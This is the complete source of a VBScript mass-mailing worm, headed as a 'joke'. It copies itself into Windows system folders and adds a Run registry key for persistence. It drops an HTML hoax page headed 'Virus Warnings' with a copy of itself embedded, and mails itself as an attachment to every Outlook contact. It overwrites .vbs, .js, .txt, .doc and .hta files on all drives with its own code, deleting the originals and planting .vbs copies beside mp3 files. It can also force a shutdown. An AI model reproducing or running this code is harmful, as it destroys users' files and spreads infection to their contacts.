rem VERY IMPORTANT PLEASE READ THIS TEXT. Autor ( burtai@crosswinds.net)
rem Begin Joke                                   (Lithuanian)
On Error Resume Next
dim fso,dirwin,dirsystem,eq,ctr,file,vbscopy
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
go()
sub go()
On Error Resume Next
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirwin&"\win.vbs")
c.Copy(dirsystem&"\very-important-txt.vbs")
write()
sent()
clear()
end sub
sub write()
On Error Resume Next
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\burtai",dirwin&"\win.vbs"
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<meta http-equiv=@-@Content-Type@-@ CONTENT=@-@text/html; charset=windows-1252@-@>"&vbcrlf& _
"<META NAME=@-@GENERATOR@-@ CONTENT=@-@Microsoft FrontPage 4.0@-@>"&vbcrlf& _
"<META NAME=@-@GENERATOR@-@ CONTENT=@-@FrontPage.Editor.Document@-@>"&vbcrlf& _
"<HTML><HEAD><TITLE>Virus Warnings !!!<?-?TITLE>"&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<p>VERY IMPORTANT PLEASE READ.</p>"&vbcrlf& _
"<p>This was sent to me so am sending to my complete address book.Some of us have supposed virus protection while"&vbcrlf& _
"others may not......hope this saves someone some grief  tho.......thanks<br>"&vbcrlf& _
"<br>"&vbcrlf& _
"<p>WARNING No. 1</p>"&vbcrlf& _
"<p>If you receive any CELCOM Screen Saver. Pls. do not install it This screensaver is very cool. It shows a  NOKIA "&vbcrlf& _
"with time  messages.After it is activated, the PC cannot boot up at all. It goes  very slow.It destroys your hard disk. The filename is CELLSAVER.EXE"&vbcrlf& _
"<br>"&vbcrlf& _
"<p>WARNING No. 2</p>"&vbcrlf& _
"Bewore! if someone named <SandMan> asks you to check out his page. DO  NOT! It is at&nbsp; <a href=@-@http://www.geocities.com/vienna/6318@-@>www.geocities.com/vienna/6318</a>."&vbcrlf& _
"This page  hacks  into  your C:\drive.DO NOT GO THERE... FOWARD THIS MAIL TO EVERYONE YOU KNOW."&vbcrlf& _
"<br>"&vbcrlf& _
"<p>WARNING No. 3</p>"&vbcrlf& _
"<p>SEND THIS TO EVERYONE IN YOUR CONTACT LIST! THIS IS NO JOKE,OK?"&vbcrlf& _
"<br>"&vbcrlf& _
"<p>WARNING: If you get an E-mail titled : &quot;Win A Holiday&quot; DO NOT open it.Delete it immediately.Microsoft just announced yesterday."&vbcrlf& _
"It is a malicious virus that WILL ERASE YOUR HARD DRIVE."&vbcrlf& _
"At this time there is no remedy."&vbcrlf& _
"<br>"&vbcrlf& _
"<p>Forward this to everyone IMMEDIATELY!!</p>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@vbscript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"code="
dta2=""&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirwin&+"\very.htm")
b.close
set d=fso.OpenTextFile(dirwin&+"\very.htm",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
Set WshShell = Wscript.CreateObject("Wscript.Shell")
WshShell.Run ("%windir%\very.htm")
end sub
sub sent()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
else
Set WshShell = Wscript.CreateObject("Wscript.Shell")
WshShell.Run ("%windir%\RUNDLL32.EXE user.exe,exitwindows")
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "Virus Warnings !!!"
male.Body = vbcrlf&"VERY IMPORTANT PLEASE READ THIS TEXT.         TEXT ATTACHMENT. "
male.Attachments.Add(dirsystem&"\very-important-txt.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub clear()
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec) 
On Error Resume Next
dim f,f1,fc,ext,ap,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="txt") or (ext="doc") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
end if
next 
end sub
sub folderlist(folderspec) 
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec) 
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next 
end sub
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function


 